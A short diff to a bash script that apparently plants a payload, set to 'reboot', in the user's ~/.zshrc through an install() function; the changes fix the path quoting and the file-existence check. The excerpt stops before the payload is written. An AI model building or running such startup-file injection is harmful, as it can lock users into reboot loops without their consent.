@@ -1,11 +1,11 @@
 #!/bin/bash
 
-path="~/.zshrc"
+path=~/.zshrc
 payload="reboot"
 
 function install()
 {
-    if [[ -f $path ]]; then
+    if [[ ! -f $path ]]; then
         touch $path
     fi
 
